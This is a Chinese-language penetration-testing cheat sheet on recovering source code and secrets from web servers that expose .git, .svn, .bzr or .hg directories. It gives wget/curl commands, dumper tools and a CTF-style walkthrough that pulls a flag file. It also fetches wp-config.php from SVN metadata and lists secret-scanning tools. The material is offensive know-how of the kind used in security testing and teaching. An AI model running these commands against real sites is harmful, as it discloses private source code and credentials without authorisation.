# 不安全的源代码管理

* [Git](#git)
  + [示例](#example)
    - [从.git/logs/HEAD恢复文件内容](#recovering-file-contents-from-gitlogshead)
    - [从.git/index恢复文件内容](#recovering-file-contents-from-gitindex)
  + [工具](#tools)
    - [自动恢复](#automatic-recovery)
      * [git-dumper.py](#git-dumperpy)
      * [diggit.py](#diggitpy)
      * [GoGitDumper](#gogitdumper)
      * [rip-git](#rip-git)
      * [GitHack](#githack)
      * [GitTools](#gittools)
    - [收集秘密信息](#harvesting-secrets)
      * [trufflehog](#trufflehog)
      * [Yar](#yar)
      * [Gitrob](#gitrob)
      * [Gitleaks](#gitleaks)
* [Subversion](#subversion)
  + [示例（WordPress）](#example-wordpress)
  + [工具](#tools-1)
    - [svn-extractor](#svn-extractor)
* [Bazaar](#bazaar)
  + [工具](#tools-2)
    - [rip-bzr.pl](#rip-bzrpl)
    - [bzr_dumper](#bzr_dumper)
* [Mercurial](#mercurial)
  + [工具](#tools-3)
    - [rip-hg.pl](#rip-hgpl)
* [参考资料](#references)

## Git

以下示例将创建.git的副本或当前提交的副本。

检查以下文件，如果它们存在，您可以提取.git文件夹。

- .git/config
- .git/HEAD
- .git/logs/HEAD

### 示例

#### 从.git/logs/HEAD恢复文件内容

1. 检查403禁止访问或目录列表以找到`/.git/`目录

2. Git将所有信息保存在`.git/logs/HEAD`中（也可以尝试小写的`head`）


2. ```powershell
    0000000000000000000000000000000000000000 15ca375e54f056a576905b41a417b413c57df6eb root <root@dfc2eabdf236.(none)> 1455532500 +0000        clone: from https://github.com/fermayo/hello-world-lamp.git
    15ca375e54f056a576905b41a417b413c57df6eb 26e35470d38c4d6815bc4426a862d5399f04865c Michael <michael@easyctf.com> 1489390329 +0000        commit: Initial.
    26e35470d38c4d6815bc4426a862d5399f04865c 6b4131bb3b84e9446218359414d636bda782d097 Michael <michael@easyctf.com> 1489390330 +0000        commit: Whoops! Remove flag.
    6b4131bb3b84e9446218359414d636bda782d097 a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd Michael <michael@easyctf.com> 1489390332 +0000        commit: Prevent directory listing.
    ```
3. 使用哈希访问提交
    ```powershell
    # create an empty .git repository
    git init test
    cd test/.git
    
    # download the file
    wget http://web.site/.git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c
    
    # first byte for subdirectory, remaining bytes for filename
    mkdir .git/object/26
    mv e35470d38c4d6815bc4426a862d5399f04865c .git/objects/26/
    
    # display the file
    git cat-file -p 26e35470d38c4d6815bc4426a862d5399f04865c
        tree 323240a3983045cdc0dec2e88c1358e7998f2e39
        parent 15ca375e54f056a576905b41a417b413c57df6eb
        author Michael <michael@easyctf.com> 1489390329 +0000
        committer Michael <michael@easyctf.com> 1489390329 +0000
        Initial.
    ```
4. 访问文件树 323240a3983045cdc0dec2e88c1358e7998f2e39
    ```powershell
    wget http://web.site/.git/objects/32/3240a3983045cdc0dec2e88c1358e7998f2e39
    mkdir .git/object/32
    mv 3240a3983045cdc0dec2e88c1358e7998f2e39 .git/objects/32/
    
    git cat-file -p 323240a3983045cdc0dec2e88c1358e7998f2e39
        040000 tree bd083286051cd869ee6485a3046b9935fbd127c0        css
        100644 blob cb6139863967a752f3402b3975e97a84d152fd8f        flag.txt
        040000 tree 14032aabd85b43a058cfc7025dd4fa9dd325ea97        fonts
        100644 blob a7f8a24096d81887483b5f0fa21251a7eefd0db1        index.html
        040000 tree 5df8b56e2ffd07b050d6b6913c72aec44c8f39d8        js
    ```
5. 查看数据 (flag.txt)
    ```powershell
    wget http://web.site/.git/objects/cb/6139863967a752f3402b3975e97a84d152fd8f
    mkdir .git/object/cb
    mv 6139863967a752f3402b3975e97a84d152fd8f .git/objects/32/
    git cat-file -p cb6139863967a752f3402b3975e97a84d152fd8f
    ```

**从 .git/index 恢复文件内容**

使用 git 索引文件解析器 https://pypi.python.org/pypi/gin（python3）。

```powershell
pip3 install gin
gin ~/git-repo/.git/index
```

恢复索引中列出的每个文件的名称和 sha1 哈希，并使用上述相同过程恢复文件。

```powershell
$ gin .git/index | egrep -e "name|sha1"
name = AWS Amazon Bucket S3/README.md
sha1 = 862a3e58d138d6809405aa062249487bee074b98

name = CRLF injection/README.md
sha1 = d7ef4d77741c38b6d3806e0c6a57bf1090eec141
```

### 工具

#### 自动恢复

##### git-dumper.py

```powershell
git clone https://github.com/arthaud/git-dumper
pip install -r requirements.txt
./git-dumper.py http://web.site/.git ~/website
```

##### diggit.py

```powershell
git clone https://github.com/bl4de/security-tools/ && cd security-tools/diggit
./diggit.py -u remote_git_repo -t temp_folder -o object_hash [-r=True]
./diggit.py -u http://web.site -t /path/to/temp/folder/ -o d60fbeed6db32865a1f01bb9e485755f085f51c1

-u 是 .git 文件夹所在的远程路径
-t 是本地文件夹的路径，该文件夹包含虚拟 Git 仓库，并以实际名称保存 blob 内容（文件）（cd /path/to/temp/folder && git init）
-o 是要下载的特定 Git 对象的哈希值
```

##### GoGitDumper

```powershell
go get github.com/c-sto/gogitdumper
gogitdumper -u http://web.site/.git/ -o yourdecideddir/.git/
git log
git checkout
```

##### rip-git

```powershell
git clone https://github.com/kost/dvcs-ripper
perl rip-git.pl -v -u "http://web.site/.git/"

git cat-file -p 07603070376d63d911f608120eb4b5489b507692
tree 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2
parent 15ca375e54f056a576905b41a417b413c57df6eb
author Michael<michael@easyctf.com> 1489389105 +0000
committer Michael<michael@easyctf.com> 1489389105 +0000

git cat-file -p 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2
```

##### GitHack

```powershell
git clone https://github.com/lijiejie/GitHack
GitHack.py http://web.site/.git/
```

##### GitTools

```powershell
git clone https://github.com/internetwache/GitTools
./gitdumper.sh http://target.tld/.git/ /tmp/destdir
git checkout -- .
```

#### 收集秘密信息

##### trufflehog

> 搜索 git 仓库中的高熵字符串和secret，深入挖掘提交历史。

```powershell
pip install truffleHog # https://github.com/dxa4481/truffleHog
truffleHog --regex --entropy=False https://github.com/dxa4481/truffleHog.git
```

##### Yar

> 通过正则表达式、熵或两者搜索用户/组织的 git 仓库中的秘密。受到臭名昭著的 truffleHog 的启发。

```powershell
go get github.com/nielsing/yar # https://github.com/nielsing/yar
yar -o orgname --both
```

##### Gitrob

> Gitrob是一个工具，旨在帮助找到推送到GitHub公共仓库的潜在敏感文件。Gitrob将克隆属于用户或组织的仓库到可配置的深度，并遍历提交历史记录，标记与潜在敏感文件的签名匹配的文件。

```powershell
go get github.com/michenriksen/gitrob # https://github.com/michenriksen/gitrob
export GITROB_ACCESS_TOKEN=deadbeefdeadbeefdeadbeefdeadbeefdeadbeef
gitrob [选项] 目标 [目标2]... [目标N]
```

##### Gitleaks

> Gitleaks提供了一种在git源代码仓库中找到未加密密钥和其他不需要的数据类型的方法。

```powershell
# 针对公共仓库运行gitleaks
docker run --rm --name=gitleaks zricethezav/gitleaks -v -r https://github.com/zricethezav/gitleaks.git

# 针对已经克隆到/tmp/的本地仓库运行gitleaks
docker run --rm --name=gitleaks -v /tmp/:/code/ zricethezav/gitleaks -v --repo-path=/code/gitleaks

# 针对特定的Github Pull请求运行gitleaks
docker run --rm --name=gitleaks -e GITHUB_TOKEN={你的令牌} zricethezav/gitleaks --github-pr=https://github.com/owner/repo/pull/9000

或者

go get -u github.com/zricethezav/gitleaks
```

## Subversion

### 示例（WordPress）

```powershell
curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base
```

1. 从http://server/path_to_vulnerable_site/.svn/wc.db下载svn数据库

   ```powershell
   INSERT INTO "NODES" VALUES(1,'trunk/test.txt',0,'trunk',1,'trunk/test.txt',2,'normal',NULL,NULL,'file',X'2829',NULL,'$sha1$945a60e68acc693fcb74abadb588aac1a9135f62',NULL,2,1456056344886288,'bl4de',38,1456056261000000,NULL,NULL);
   ```

2. 下载有趣的文件

   * 移除\$sha1\$前缀
   * 添加.svn-base后缀
   * 使用哈希的第一个字节作为`pristine/`目录的子目录（本例中为`94`）
   * 创建完整路径，即：`http://server/path_to_vulnerable_site/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base`

### 工具

#### svn-extractor

```powershell
git clone https://github.com/anantshri/svn-extractor.git
python svn-extractor.py –url "带有.svn的url"
```

## Bazaar

### 工具

#### rip-bzr.pl

```powershell
wget https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-bzr.pl
docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-bzr.pl -v -u
```

#### bzr_dumper

```powershell
git clone https://github.com/SeahunOh/bzr_dumper
python3 dumper.py -u "http://127.0.0.1:5000/" -o source
创建了一个独立树（格式：2a）                                                                                                                                                       
[!] 目标 : http://127.0.0.1:5000/
[+] 开始。
[+] 获取repository/pack-names
[+] 获取README
[+] 获取checkout/dirstate
[+] 获取checkout/views
[+] 获取branch/branch.conf
[+] 获取branch/format
[+] 获取branch/last-revision
[+] 获取branch/tag
[+] 获取b'154411f0f33adc3ff8cfb3d34209cbd1'
[*] 完成

$ bzr revert
 N  application.py
 N  database.py
 N  static/   
```

## Mercurial

### 工具

#### rip-hg.pl

```powershell
wget https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-hg.pl
docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-hg.pl -v -u
```

## 参考资料

- [bl4de, hidden_directories_leaks](https://github.com/bl4de/research/tree/master/hidden_directories_leaks)
- [bl4de, diggit](https://github.com/bl4de/security-tools/tree/master/diggit)
- [Gitrob: Now in Go - Michael Henriksen](https://michenriksen.com/blog/gitrob-now-in-go/)
